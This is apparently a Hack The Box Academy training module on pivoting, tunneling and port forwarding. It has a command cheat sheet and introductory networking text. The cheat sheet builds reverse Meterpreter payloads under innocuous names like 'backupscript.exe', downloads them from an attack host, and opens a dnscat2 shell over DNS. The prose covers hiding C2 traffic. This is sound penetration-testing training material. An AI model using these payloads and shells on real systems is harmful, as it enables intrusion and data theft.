
<body>
  <div class="container">
<link rel="stylesheet" href="style.css">

<h1 id="10-pivoting-tunneling-and-port-forwarding">10. Pivoting, Tunneling, and Port Forwarding</h1>
<h2 id="-cheat-sheet-"><strong>Cheat Sheet</strong></h2>
<p>The cheat sheet is a useful command reference for this module.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>ifconfig</code></td>
<td>Linux-based command that displays all current network configurations of a system.</td>
</tr>
<tr>
<td><code>ipconfig</code></td>
<td>Windows-based command that displays all system network configurations.</td>
</tr>
<tr>
<td><code>netstat -r</code></td>
<td>Command used to display the routing table for all IPv4-based protocols.</td>
</tr>
<tr>
<td><code>nmap -sT -p22,3306 &lt;IPaddressofTarget&gt;</code></td>
<td>Nmap command used to scan a target for open ports allowing SSH or MySQL connections.</td>
</tr>
<tr>
<td><code>ssh -L 1234:localhost:3306 Ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH comand used to create an SSH tunnel from a local machine on local port <code>1234</code> to a remote target using port 3306.</td>
</tr>
<tr>
<td>`netstat -antp \</td>
<td>grep 1234`</td>
<td>Netstat option used to display network connections associated with a tunnel created. Using <code>grep</code> to filter based on local port <code>1234</code> .</td>
</tr>
<tr>
<td><code>nmap -v -sV -p1234 localhost</code></td>
<td>Nmap command used to scan a host through a connection that has been made on local port <code>1234</code>.</td>
</tr>
<tr>
<td><code>ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH command that instructs the ssh client to request the SSH server forward all data via port <code>1234</code> to <code>localhost:3306</code>.</td>
</tr>
<tr>
<td><code>ssh -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>SSH command used to perform a dynamic port forward on port <code>9050</code> and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.</td>
</tr>
<tr>
<td><code>tail -4 /etc/proxychains.conf</code></td>
<td>Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.</td>
</tr>
<tr>
<td><code>proxychains nmap -v -sn 172.16.5.1-200</code></td>
<td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range <code>172.16.5.1-200</code> with increased verbosity (<code>-v</code>) disabling ping scan (<code>-sn</code>).</td>
</tr>
<tr>
<td><code>proxychains nmap -v -Pn -sT 172.16.5.19</code></td>
<td>Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (<code>-v</code>), disabling ping discover (<code>-Pn</code>), and using TCP connect scan type (<code>-sT</code>).</td>
</tr>
<tr>
<td><code>proxychains msfconsole</code></td>
<td>Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.</td>
</tr>
<tr>
<td><code>msf6 &gt; search rdp_scanner</code></td>
<td>Metasploit search that attempts to find a module called <code>rdp_scanner</code>.</td>
</tr>
<tr>
<td><code>proxychains xfreerdp /v:&lt;IPaddressofTarget&gt; /u:victor /p:pass@123</code></td>
<td>Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.</td>
</tr>
<tr>
<td><code>msfvenom -p windows/x64/meterpreter/reverse_https lhost= &lt;InteralIPofPivotHost&gt; -f exe -o backupscript.exe LPORT=8080</code></td>
<td>Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following <code>lhost=</code> on local port 8080 (<code>LPORT=8080</code>). Payload will take the form of an executable file called <code>backupscript.exe</code>.</td>
</tr>
<tr>
<td><code>msf6 &gt; use exploit/multi/handler</code></td>
<td>Used to select the multi-handler exploit module in Metasploit.</td>
</tr>
<tr>
<td><code>scp backupscript.exe ubuntu@&lt;ipAddressofTarget&gt;:~/</code></td>
<td>Uses secure copy protocol (<code>scp</code>) to transfer the file <code>backupscript.exe</code> to the specified host and places it in the Ubuntu user&#39;s home directory (<code>:~/</code>).</td>
</tr>
<tr>
<td><code>python3 -m http.server 8123</code></td>
<td>Uses Python3 to start a simple HTTP server listening on port <code>8123</code>. Can be used to retrieve files from a host.</td>
</tr>
<tr>
<td><code>Invoke-WebRequest -Uri &quot;http://172.16.5.129:8123/backupscript.exe&quot; -OutFile &quot;C:\backupscript.exe&quot;</code></td>
<td>PowerShell command used to download a file called backupscript.exe from a webserver (<code>172.16.5.129:8123</code>) and then save the file to location specified after <code>-OutFile</code>.</td>
</tr>
<tr>
<td><code>ssh -R &lt;InternalIPofPivotHost&gt;:8080:0.0.0.0:80 ubuntu@&lt;ipAddressofTarget&gt; -vN</code></td>
<td>SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port <code>8080</code> on the attack host to port <code>80</code> on the target.</td>
</tr>
<tr>
<td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;IPaddressofAttackHost -f elf -o backupjob LPORT=8080</code></td>
<td>Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after <code>LHOST=</code> on port 8080 (<code>LPORT=8080</code>). Payload takes the form of an executable elf file called backupjob.</td>
</tr>
<tr>
<td><code>msf6&gt; run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23</code></td>
<td>Metasploit command that runs a ping sweep module against the specified network segment (<code>RHOSTS=172.16.5.0/23</code>).</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td>`for i in {1..254} ;do (ping -c 1 172.16.5.$i \</td>
<td>grep &quot;bytes from&quot; &amp;) ;done`</td>
<td>For Loop used on a Linux-based system to discover devices in a specified network segment.</td>
</tr>
<tr>
<td>`for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \</td>
<td>find &quot;Reply&quot;`</td>
<td>For Loop used on a Windows-based system to discover devices in a specified network segment.</td>
</tr>
<tr>
<td>`1..254 \</td>
<td>% {&quot;172.16.5.$($<em>): $(Test-Connection -count 1 -comp 172.15.5.$($</em>) -quiet)&quot;}`</td>
<td>PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.</td>
</tr>
<tr>
<td><code>msf6 &gt; use auxiliary/server/socks_proxy</code></td>
<td>Metasploit command that selects the <code>socks_proxy</code> auxiliary module.</td>
</tr>
<tr>
<td><code>msf6 auxiliary(server/socks_proxy) &gt; jobs</code></td>
<td>Metasploit command that lists all currently running jobs.</td>
</tr>
<tr>
<td><code>socks4 127.0.0.1 9050</code></td>
<td>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.</td>
</tr>
<tr>
<td><code>Socks5 127.0.0.1 1080</code></td>
<td>Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.</td>
</tr>
<tr>
<td><code>msf6 &gt; use post/multi/manage/autoroute</code></td>
<td>Metasploit command used to select the autoroute module.</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
<tr>
<td><code>meterpreter &gt; help portfwd</code></td>
<td>Meterpreter command used to display the features of the portfwd command.</td>
</tr>
<tr>
<td><code>meterpreter &gt; portfwd add -l 3300 -p 3389 -r &lt;IPaddressofTarget&gt;</code></td>
<td>Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.</td>
</tr>
<tr>
<td><code>xfreerdp /v:localhost:3300 /u:victor /p:pass@123</code></td>
<td>Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.</td>
</tr>
<tr>
<td><code>netstat -antp</code></td>
<td>Used to display all (<code>-a</code>) active network connections with associated process IDs. <code>-t</code> displays only TCP connections.<code>-n</code> displays only numerical addresses. <code>-p</code> displays process IDs associated with each displayed connection.</td>
</tr>
<tr>
<td><code>meterpreter &gt; portfwd add -R -l 8081 -p 1234 -L &lt;IPaddressofAttackHost&gt;</code></td>
<td>Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port <code>1234</code> listening on the IP address of the Attack Host.</td>
</tr>
<tr>
<td><code>meterpreter &gt; bg</code></td>
<td>Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux</td>
</tr>
<tr>
<td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofAttackHost&gt;:80</code></td>
<td>Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.</td>
</tr>
<tr>
<td><code>socat TCP4-LISTEN:8080,fork TCP4:&lt;IPaddressofTarget&gt;:8443</code></td>
<td>Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.</td>
</tr>
<tr>
<td><code>plink -D 9050 ubuntu@&lt;IPaddressofTarget&gt;</code></td>
<td>Windows-based command that uses PuTTY&#39;s Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host.</td>
</tr>
<tr>
<td><code>sudo apt-get install sshuttle</code></td>
<td>Uses apt-get to install the tool sshuttle.</td>
</tr>
<tr>
<td><code>sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v</code></td>
<td>Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (<code>172.16.5.0</code>).</td>
</tr>
<tr>
<td><code>sudo git clone https://github.com/klsecservices/rpivot.git</code></td>
<td>Clones the rpivot project GitHub repository.</td>
</tr>
<tr>
<td><code>sudo apt-get install python2.7</code></td>
<td>Uses apt-get to install python2.7.</td>
</tr>
<tr>
<td><code>python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0</code></td>
<td>Used to run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).</td>
</tr>
<tr>
<td><code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code></td>
<td>Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.</td>
</tr>
<tr>
<td><code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code></td>
<td>Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.</td>
</tr>
<tr>
<td><code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code></td>
<td>Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.</td>
</tr>
<tr>
<td><code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code></td>
<td>Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.</td>
</tr>
<tr>
<td><code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code></td>
<td>Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code> that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.</td>
</tr>
<tr>
<td><code>netsh.exe interface portproxy show v4tov4</code></td>
<td>Windows-based command used to view the configurations of a portproxy rule called v4tov4.</td>
</tr>
<tr>
<td><code>git clone https://github.com/iagox86/dnscat2.git</code></td>
<td>Clones the <code>dnscat2</code> project GitHub repository.</td>
</tr>
<tr>
<td><code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache</code></td>
<td>Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>inlanefreight.local</code> with the no-cache option enabled.</td>
</tr>
<tr>
<td><code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code></td>
<td>Clones the dnscat2-powershell project Github repository.</td>
</tr>
<tr>
<td><code>Import-Module dnscat2.ps1</code></td>
<td>PowerShell command used to import the dnscat2.ps1 tool.</td>
</tr>
<tr>
<td><code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code></td>
<td>PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).</td>
</tr>
<tr>
<td><code>dnscat2&gt; ?</code></td>
<td>Used to list dnscat2 options.</td>
</tr>
<tr>
<td><code>dnscat2&gt; window -i 1</code></td>
<td>Used to interact with an established dnscat2 session.</td>
</tr>
<tr>
<td><code>./chisel server -v -p 1234 --socks5</code></td>
<td>Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.</td>
</tr>
<tr>
<td><code>./chisel client -v 10.129.202.64:1234 socks</code></td>
<td>Used to connect to a chisel server at the specified IP address &amp; port using socks.</td>
</tr>
<tr>
<td><code>git clone https://github.com/utoni/ptunnel-ng.git</code></td>
<td>Clones the ptunnel-ng project GitHub repository.</td>
</tr>
<tr>
<td><code>sudo ./autogen.sh</code></td>
<td>Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.</td>
</tr>
<tr>
<td><code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code></td>
<td>Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).</td>
</tr>
<tr>
<td><code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code></td>
<td>Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).</td>
</tr>
<tr>
<td><code>ssh -p2222 -lubuntu 127.0.0.1</code></td>
<td>SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.</td>
</tr>
<tr>
<td><code>regsvr32.exe SocksOverRDP-Plugin.dll</code></td>
<td>Windows-based command used to register the SocksOverRDP-PLugin.dll.</td>
</tr>
<tr>
<td>`netstat -antb \</td>
<td>findstr 1080`</td>
<td>Windows-based command used to list TCP network connections listening on port 1080.</td>
</tr>
</tbody>
</table>
<h2 id="introduction-to-pivoting-tunneling-and-port-forwarding">Introduction to Pivoting, Tunneling, and Port Forwarding</h2>
<hr>
<p><img src="https://academy.hackthebox.com/storage/modules/158/PivotingandTunnelingVisualized.gif" alt=""></p>
<p>During a <code>red team engagement</code>, <code>penetration test</code>, or an <code>Active Directory assessment</code>, we will often find ourselves in a situation where we might have already compromised the required <code>credentials</code>, <code>ssh keys</code>, <code>hashes</code>, or <code>access tokens</code> to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a <code>pivot host</code> that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our <code>privilege level</code>, <code>network connections</code>, and potential <code>VPN or other remote access software</code>. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of <code>moving to other networks through a compromised host to find more targets on different network segments</code>.</p>
<p>There are many different terms used to describe a compromised host that we can use to <code>pivot</code> to a previously unreachable network segment. Some of the most common are:</p>
<ul>
<li><code>Pivot Host</code></li>
<li><code>Proxy</code></li>
<li><code>Foothold</code></li>
<li><code>Beach Head system</code></li>
<li><code>Jump Host</code></li>
</ul>
<p>Pivoting&#39;s primary use is to defeat segmentation (both physically and virtually) to access an isolated network. <code>Tunneling</code>, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:</p>
<p>We have a <code>key</code> we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.</p>
<p>Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.</p>
<hr>
<p>We will inevitably come across several different terms used to describe the same thing in IT &amp; the Infosec industry. With pivoting, we will notice that this is often referred to as <code>Lateral Movement</code>.</p>
<p><code>Isn&#39;t it the same thing as pivoting?</code></p>
<p>The answer to that is not exactly. Let&#39;s take a second to compare and contrast <code>Lateral Movement</code> with <code>Pivoting and Tunneling</code>, as there can be some confusion as to why some consider them different concepts.</p>
<hr>
<h3 id="lateral-movement-pivoting-and-tunneling-compared">Lateral Movement, Pivoting, and Tunneling Compared</h3>
<p><strong>Lateral Movement</strong></p>
<p>Lateral movement can be described as a technique used to further our access to additional <code>hosts</code>, <code>applications</code>, and <code>services</code> within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts. In addition to the explanation we have provided for this concept, we can also study how other respected organizations explain Lateral Movement. Check out these two explanations when time permits:</p>
<p><a href="https://www.paloaltonetworks.com/cyberpedia/what-is-lateral-movement">Palo Alto Network&#39;s Explanation</a></p>
<p><a href="https://attack.mitre.org/tactics/TA0008/">MITRE&#39;s Explanation</a></p>
<p>One practical example of <code>Lateral Movement</code> would be:</p>
<p>During an assessment, we gained initial access to the target environment and were able to gain control of the local administrator account. We performed a network scan and found three more Windows hosts in the network. We attempted to use the same local administrator credentials, and one of those devices shared the same administrator account. We used the credentials to move laterally to that other device, enabling us to compromise the domain further.</p>
<p><strong>Pivoting</strong></p>
<p>Utilizing multiple hosts to cross <code>network</code> boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.</p>
<p>One practical example of <code>Pivoting</code> would be:</p>
<p>During one tricky engagement, the target had their network physically and logically separated. This separation made it difficult for us to move around and complete our objectives. We had to search the network and compromise a host that turned out to be the engineering workstation used to maintain and monitor equipment in the operational environment, submit reports, and perform other administrative duties in the enterprise environment. That host turned out to be dual-homed (having more than one physical NIC connected to different networks). Without it having access to both enterprise and operational networks, we would not have been able to pivot as we needed to complete our assessment.</p>
<p><strong>Tunneling</strong></p>
<p>We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command &amp; Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.</p>
<p>One practical example of <code>Tunneling</code> would be:</p>
<p>One way we used Tunneling was to craft our traffic to hide in HTTP and HTTPS. This is a common way we maintained Command and Control (C2) of the hosts we had compromised within a network. We masked our instructions inside GET and POST requests that appeared as normal traffic and, to the untrained eye, would look like a web request or response to any old website. If the packet were formed properly, it would be forwarded to our Control server. If it were not, it would be redirected to another website, potentially throwing off the defender checking it out.</p>
<p>To summarize, we should look at these tactics as separate things. Lateral Movement helps us spread wide within a network, elevating our privileges, while Pivoting allows us to delve deeper into the networks accessing previously unreachable environments. Keep this comparison in mind while moving through this module.</p>
<hr>
<p>Now that we have been introduced to the module and have defined and compared Lateral Movement, Pivoting, and Tunneling, let&#39;s dive into some of the networking concepts that enable us to perform these tactics.</p>
<h2 id="the-networking-behind-pivoting">The Networking Behind Pivoting</h2>
<hr>
<p>Being able to grasp the concept of <code>pivoting</code> well enough to succeed at it on an engagement requires a solid fundamental understanding of some key networking concepts. This section will be a quick refresher on essential foundational networking concepts to understand pivoting.</p>
<h3 id="ip-addressing-nics">IP Addressing &amp; NICs</h3>
<p>Every computer that is communicating on a network needs an IP address. If it doesn&#39;t have one, it is not on a network. The IP address is assigned in software and usually obtained automatically from a DHCP server. It is also common to see computers with statically assigned IP addresses. Static IP assignment is common with:</p>
<ul>
<li>Servers</li>
<li>Routers</li>
<li>Switch virtual interfaces</li>
<li>Printers</li>
<li>And any devices that are providing critical services to the network</li>
</ul>
<p>Whether assigned <code>dynamically</code> or <code>statically</code>, the IP address is assigned to a <code>Network Interface Controller</code> (<code>NIC</code>). Commonly, the NIC is referred to as a <code>Network Interface Card</code> or <code>Network Adapter</code>. A computer can have multiple NICs (physical and virtual), meaning it can have multiple IP addresses assigned, allowing it to communicate on various networks. Identifying pivoting opportunities will often depend on the specific IPs assigned to the hosts we compromise because they can indicate the networks compromised hosts can reach. This is why it is important for us to always check for additional NICs using commands like <code>ifconfig</code> (in macOS and Linux) and <code>ipconfig</code> (in Windows).</p>
<p><strong>Using ifconfig</strong></p>
<p>The Networking Behind Pivoting</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ifconfig

eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 134.122.100.200  netmask 255.255.240.0  broadcast 134.122.111.255
        inet6 fe80::e973:b08d:7bdf:dc67  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;
        ether 12:ed:13:35:68:f5  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
        RX packets<span class="hljs-number"> 8844 </span> bytes<span class="hljs-number"> 803773 </span>(784.9 KiB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 5698 </span> bytes<span class="hljs-number"> 9713896 </span>(9.2 MiB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0

eth1: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 10.106.0.172  netmask 255.255.240.0  broadcast 10.106.15.255
        inet6 fe80::a5bf:1cd4:9bca:b3ae  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;
        ether 4e:c7:60:b0:01:8d  txqueuelen<span class="hljs-number"> 1000 </span> (Ethernet)
        RX packets<span class="hljs-number"> 15 </span> bytes<span class="hljs-number"> 1620 </span>(1.5 KiB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 18 </span> bytes<span class="hljs-number"> 1858 </span>(1.8 KiB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0

lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen<span class="hljs-number"> 128 </span> scopeid 0x10&lt;host&gt;
        loop  txqueuelen<span class="hljs-number"> 1000 </span> (Local Loopback)
        RX packets<span class="hljs-number"> 19787 </span> bytes<span class="hljs-number"> 10346966 </span>(9.8 MiB)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 19787 </span> bytes<span class="hljs-number"> 10346966 </span>(9.8 MiB)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0

tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt;  mtu 1500
        inet 10.10.15.54  netmask 255.255.254.0  destination 10.10.15.54
        inet6 fe80::c85a:5717:5e3a:38de  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x20&lt;link&gt;
        inet6 dead:beef:2::1034  prefixlen<span class="hljs-number"> 64 </span> scopeid 0x0&lt;global&gt;
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen<span class="hljs-number"> 500 </span> (UNSPEC)
        RX packets<span class="hljs-number"> 0 </span> bytes<span class="hljs-number"> 0 </span>(0.0 B)
        RX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span> overruns<span class="hljs-number"> 0 </span> frame 0
        TX packets<span class="hljs-number"> 7 </span> bytes<span class="hljs-number"> 336 </span>(336.0 B)
        TX errors<span class="hljs-number"> 0 </span> dropped<span class="hljs-number"> 0 </span>overruns<span class="hljs-number"> 0 </span> carrier<span class="hljs-number"> 0 </span> collisions 0
</code></pre>
<p>In the output above, each NIC has an identifier (<code>eth0</code>, <code>eth1</code>, <code>lo</code>, <code>tun0</code>) followed by addressing information and traffic statistics. The tunnel interface (tun0) indicates a VPN connection is active. When we connect to any of HTB&#39;s VPN servers through Pwnbox or our own attack host, we will always notice a tunnel interface gets created and assigned an IP address. The VPN allows us to access the lab network environments hosted by HTB. Keep in mind that these lab networks are not reachable without having a tunnel established. The VPN encrypts traffic and also establishes a tunnel over a public network (often the Internet), through <code>NAT</code> on a public-facing network appliance, and into the internal/private network. Also, notice the IP addresses assigned to each NIC. The IP assigned to eth0 (<code>134.122.100.200</code>) is a publicly routable IP address. Meaning ISPs will route traffic originating from this IP over the Internet. We will see public IPs on devices that are directly facing the Internet, commonly hosted in DMZs. The other NICs have private IP addresses, which are routable within internal networks but not over the public Internet. At the time of writing, anyone that wants to communicate over the Internet must have at least one public IP address assigned to an interface on the network appliance that connects to the physical infrastructure connecting to the Internet. Recall that NAT is commonly used to translate private IP addresses to public IP addresses.</p>
<p><strong>Using ipconfig</strong></p>
<p>The Networking Behind Pivoting</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">Users</span>\<span class="hljs-selector-tag">htb-student</span>&gt; <span class="hljs-selector-tag">ipconfig</span>

<span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">IP</span> <span class="hljs-selector-tag">Configuration</span>

<span class="hljs-selector-tag">Unknown</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">NordLynx</span>:

   <span class="hljs-selector-tag">Media</span> <span class="hljs-selector-tag">State</span> . . . . . . . . . . . : <span class="hljs-selector-tag">Media</span> <span class="hljs-selector-tag">disconnected</span>
   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . :

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">Ethernet0</span> 2:

   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . : <span class="hljs-selector-class">.htb</span>
   <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : <span class="hljs-selector-tag">dead</span><span class="hljs-selector-pseudo">:beef</span><span class="hljs-selector-pseudo">::1a9</span>
   <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : <span class="hljs-selector-tag">dead</span><span class="hljs-selector-pseudo">:beef</span><span class="hljs-selector-pseudo">::f58b</span><span class="hljs-selector-pseudo">:6381</span><span class="hljs-selector-pseudo">:c648</span><span class="hljs-selector-pseudo">:1fb0</span>
   <span class="hljs-selector-tag">Temporary</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span>. . . . . . : <span class="hljs-selector-tag">dead</span><span class="hljs-selector-pseudo">:beef</span><span class="hljs-selector-pseudo">::dd0b</span><span class="hljs-selector-pseudo">:7cda</span><span class="hljs-selector-pseudo">:7118</span><span class="hljs-selector-pseudo">:3373</span>
   <span class="hljs-selector-tag">Link-local</span> <span class="hljs-selector-tag">IPv6</span> <span class="hljs-selector-tag">Address</span> . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::f58b</span><span class="hljs-selector-pseudo">:6381</span><span class="hljs-selector-pseudo">:c648</span><span class="hljs-selector-pseudo">:1fb0</span>%8
   <span class="hljs-selector-tag">IPv4</span> <span class="hljs-selector-tag">Address</span>. . . . . . . . . . . : 10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.221</span><span class="hljs-selector-class">.36</span>
   <span class="hljs-selector-tag">Subnet</span> <span class="hljs-selector-tag">Mask</span> . . . . . . . . . . . : 255<span class="hljs-selector-class">.255</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>
   <span class="hljs-selector-tag">Default</span> <span class="hljs-selector-tag">Gateway</span> . . . . . . . . . : <span class="hljs-selector-tag">fe80</span><span class="hljs-selector-pseudo">::250</span><span class="hljs-selector-pseudo">:56ff</span><span class="hljs-selector-pseudo">:feb9</span><span class="hljs-selector-pseudo">:df81</span>%8
                                       10<span class="hljs-selector-class">.129</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span>

<span class="hljs-selector-tag">Ethernet</span> <span class="hljs-selector-tag">adapter</span> <span class="hljs-selector-tag">Ethernet</span>:

   <span class="hljs-selector-tag">Media</span> <span class="hljs-selector-tag">State</span> . . . . . . . . . . . : <span class="hljs-selector-tag">Media</span> <span class="hljs-selector-tag">disconnected</span>
   <span class="hljs-selector-tag">Connection-specific</span> <span class="hljs-selector-tag">DNS</span> <span class="hljs-selector-tag">Suffix</span>  . :
</code></pre>
<p>The output directly above is from issuing <code>ipconfig</code> on a Windows system. We can see that this system has multiple adapters, but only one of them has IP addresses assigned. There are <a href="https://www.cisco.com/c/en/us/solutions/ipv6/overview.html">IPv6</a> addresses and an <a href="https://en.wikipedia.org/wiki/IPv4">IPv4</a> address. This module will primarily focus on networks running IPv4 as it remains the most common IP addressing mechanism in enterprise LANs. We will notice some adapters, like the one in the output above, will have an IPv4 and an IPv6 address assigned in a <a href="https://www.cisco.com/c/dam/en\_us/solutions/industries/docs/gov/IPV6at\_a\_glance\_c45-625859.pdf">dual-stack configuration</a> allowing resources to be reached over IPv4 or IPv6.</p>
